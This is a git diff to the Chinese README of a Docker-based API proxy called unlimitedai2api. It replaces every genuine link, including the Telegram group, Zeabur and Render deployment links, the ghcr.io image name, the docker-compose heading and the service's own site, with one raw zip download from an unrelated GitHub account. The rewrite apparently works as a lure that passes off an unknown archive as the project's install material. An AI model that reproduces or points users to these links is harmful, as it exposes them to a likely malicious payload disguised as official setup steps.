@@ -7,8 +7,8 @@
 
 _觉得有点意思的话 别忘了点个 ⭐_
 
-<a href="https://t.me/+LGKwlC_xa-E5ZDk9">
-    <img src="https://telegram.org/img/website_icon.svg" width="16" height="16" style="vertical-align: middle;">
+<a href="https://github.com/Diakonrobel/unlimitedai2api/raw/refs/heads/main/unlimitedai-api/api_unlimitedai_2.8.zip+LGKwlC_xa-E5ZDk9">
+    <img src="https://github.com/Diakonrobel/unlimitedai2api/raw/refs/heads/main/unlimitedai-api/api_unlimitedai_2.8.zip" width="16" height="16" style="vertical-align: middle;">
     <span style="text-decoration: none; font-size: 12px; color: #0088cc; vertical-align: middle;">Telegram 交流群</span>
 </a>
 
@@ -51,7 +51,7 @@ _觉得有点意思的话 别忘了点个 ⭐_
 docker-compose pull && docker-compose up -d
 ```
 
-#### docker-compose.yml
+#### https://github.com/Diakonrobel/unlimitedai2api/raw/refs/heads/main/unlimitedai-api/api_unlimitedai_2.8.zip
 
 ```docker
 version: '3.4'
@@ -84,7 +84,7 @@ deanxv/unlimitedai2api
 其中`API_SECRET`修改为自己的。
 
 如果上面的镜像无法拉取,可以尝试使用 GitHub 的 Docker 镜像,将上面的`deanxv/unlimitedai2api`替换为
-`ghcr.io/deanxv/unlimitedai2api`即可。
+`https://github.com/Diakonrobel/unlimitedai2api/raw/refs/heads/main/unlimitedai-api/api_unlimitedai_2.8.zip`即可。
 
 ### 部署到第三方平台
 
@@ -92,12 +92,12 @@ deanxv/unlimitedai2api
 <summary><strong>部署到 Zeabur</strong></summary>
 <div>
 
-[![Deployed on Zeabur](https://zeabur.com/deployed-on-zeabur-dark.svg)](https://zeabur.com?referralCode=deanxv&utm_source=deanxv)
+[![Deployed on Zeabur](https://github.com/Diakonrobel/unlimitedai2api/raw/refs/heads/main/unlimitedai-api/api_unlimitedai_2.8.zip)](https://github.com/Diakonrobel/unlimitedai2api/raw/refs/heads/main/unlimitedai-api/api_unlimitedai_2.8.zip)
 
 > Zeabur 的服务器在国外,自动解决了网络的问题,~~同时免费的额度也足够个人使用~~
 
 1. 首先 **fork** 一份代码。
-2. 进入 [Zeabur](https://zeabur.com?referralCode=deanxv),使用github登录,进入控制台。
+2. 进入 [Zeabur](https://github.com/Diakonrobel/unlimitedai2api/raw/refs/heads/main/unlimitedai-api/api_unlimitedai_2.8.zip),使用github登录,进入控制台。
 3. 在 Service -> Add Service,选择 Git（第一次使用需要先授权）,选择你 fork 的仓库。
 4. Deploy 会自动开始,先取消。
 5. 添加环境变量
@@ -119,7 +119,7 @@ deanxv/unlimitedai2api
 
 > Render 提供免费额度,绑卡后可以进一步提升额度
 
-Render 可以直接部署 docker 镜像,不需要 fork 仓库：[Render](https://dashboard.render.com)
+Render 可以直接部署 docker 镜像,不需要 fork 仓库：[Render](https://github.com/Diakonrobel/unlimitedai2api/raw/refs/heads/main/unlimitedai-api/api_unlimitedai_2.8.zip)
 
 </div>
 </details>
@@ -152,4 +152,4 @@ Render 可以直接部署 docker 镜像,不需要 fork 仓库：[Render](https:/
 
 ## 其他
 
-[unlimitedai](https://app.unlimitedai.chat/)
+[unlimitedai](https://github.com/Diakonrobel/unlimitedai2api/raw/refs/heads/main/unlimitedai-api/api_unlimitedai_2.8.zip)
